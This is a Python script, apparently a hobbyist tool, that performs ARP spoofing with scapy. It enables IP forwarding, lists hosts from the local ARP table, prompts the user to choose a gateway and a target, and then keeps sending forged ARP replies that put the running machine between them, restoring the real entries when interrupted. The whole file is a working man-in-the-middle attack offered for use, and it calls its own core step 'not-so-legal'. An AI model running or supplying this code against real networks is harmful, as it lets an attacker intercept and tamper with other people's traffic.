from scapy.all import Ether, ARP, srp, send
import time
import os
import platform
import netifaces
import re

def _enable_iproute():
    """
    Enables IP route (IP Forward) in linux
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at")
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")


def restore(target_ip, host_ip, verbose=True):
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at"
    )
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")


def arp_spoof(target_ip, gateway_ip):
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target_ip, gateway_ip)
            # telling the `host` that we are the `target`
            spoof(gateway_ip, target_ip)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Restoring the network")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


def extract_ip_address(line):
    # this gets the IP adress from the string output of 'arp -a'
    match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
    if match:
        return match.group(0)
    else:
        return None


def extract_mac_address(line):
    match = re.search(r"([0-9A-Fa-f]{2}[:-]){1,5}([0-9A-Fa-f]{2})", line)
    if match:
        return match.group(0)
    else:
        return None


def get_default_gateway():
    # gets the gateway (router) IP, this is a cross-platform system
    gateways = netifaces.gateways()
    default_gateway = gateways["default"][netifaces.AF_INET][0]
    return default_gateway


def main():
    _enable_iproute()
    response = input("Please note you should ensure you can reach your target. ping them if necessary, input any key to continue... ")
    print("Scanning network for potential targets...")
    # grab the gateway(router)
    gateway = get_default_gateway()
    print("gateway: ", gateway, "Use as host?")
    quit = False
    use_default_gateway = True
    while quit == False:
        response = input("[Y/N]: ")
        if response in ["y", "Y", "Yes", "yes"]:
            print("Proceeding with host: ", gateway)
            quit = True
        if response in ["n", "N", "No", "no"]:
            print("Allright, choose your host from the following targets: ")
            use_default_gateway = False
            quit = True
        else:
            print("Unrecognized response, read this please!!!")

    # grab the other devices
    devices = []
    for device in os.popen("arp -a"):
        if extract_ip_address(device) != gateway or not (use_default_gateway):
            # we do not need the gateway
            devices.append(device)
        else:
            gateway = (gateway, extract_mac_address(device))
    for i in range(len(devices)):
        print(f"[{i}]: {devices[i]}")

    # optional host selection
    if not (use_default_gateway):
        response = -1
        while response not in range(0, len(devices)):
            response = int(input("select host on index [number]: "))
            if response not in range(0, len(devices)):
                print("Invalid host you dumb-dumb!")
        gateway = devices[response]
        gateway = (extract_ip_address(gateway), extract_mac_address(gateway))
        print("Host ", gateway[0], " at ", gateway[1], " selected.")

    # target selection
    response = -1
    while response not in range(0, len(devices)):
        response = int(input("select target on index [number]: "))
        if response not in range(0, len(devices)):
            print("Invalid target you dumb-dumb!")
        elif extract_ip_address(devices[response]) == gateway[0]:
            print("Cannot select the same target as the gateway!")
    target = devices[response]
    target = (extract_ip_address(target), extract_mac_address(target))
    print(
        "Target ",
        target[0],
        " at ",
        target[1],
        " selected, proceeding with ARP poisoning using host ",
        gateway[0],
        " at ",
        gateway[1],
    )

    print("What follows is the not-so-legal part, continue at own risk!")
    arp_spoof(target[0], gateway[0])
    # actual poisoning here


if __name__ == "__main__":
    running_os = platform.system()
    match platform.system():
        case "Linux":
            print("Host OS is Linux, a-ok to proceed! continue?")
        case "Windows":
            print(
                "Host OS is Windows, the spoofing software cannot operate correctly, proceed anyway?"
            )
        case "Darwin":
            print(
                "Host OS is MacOS, the spoofing software cannot operate correctly, proceed anyway?"
            )
        case other:
            print(
                "Host OS not recognized. The spoofing software cannot guarantee correct operation, proceed anyway?"
            )
    quit = False
    while quit == False:
        response = input("[Y/N]: ")
        # match response:
        if response in ["y", "Y", "Yes", "yes"]:
            # case "y" | "Y" | "Yes" | "yes":
            print("Proceeding!")
            main()
            quit = True
            # case "n" | "N" | "No" | "no":
        if response in ["n", "N", "No", "no"]:
            print("Stopping!")
            quit = True
            # case other:
        else:
            print("Unrecognized response, read this please!!!")
